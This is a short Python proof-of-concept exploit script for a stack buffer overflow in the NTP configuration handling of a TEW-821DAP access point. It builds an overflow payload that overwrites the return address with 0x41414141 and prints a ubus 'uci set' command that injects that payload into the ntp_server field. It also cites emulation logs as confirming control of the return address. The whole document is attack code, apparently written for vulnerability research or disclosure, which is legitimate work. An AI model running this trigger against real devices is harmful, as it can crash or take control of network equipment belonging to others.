#!/usr/bin/env python3
"""PoC: TEW-821DAP mycli NTP config Stack Overflow | CWE-121 | CVSS 9.8"""
import struct, socket, json
PAYLOAD = b"A" * 84 + struct.pack(">I", 0x41414141)
print("TEW-821DAP mycli NTP config Stack Overflow PoC")
print(f"Payload: {len(PAYLOAD)} bytes -> overwrite $ra with 0x41414141")
print()
print("ubus trigger:")
print(f"ubus call uci set '{{\"config\":\"cameo\",\"section\":\"time\",\"values\":{{\"ntp_server\":\"{PAYLOAD.decode('latin-1')}\"}}}}'")
print()
print("FirmRec: 36 simexp logs confirm Return to 0x41414141 (evidence/*.log)")
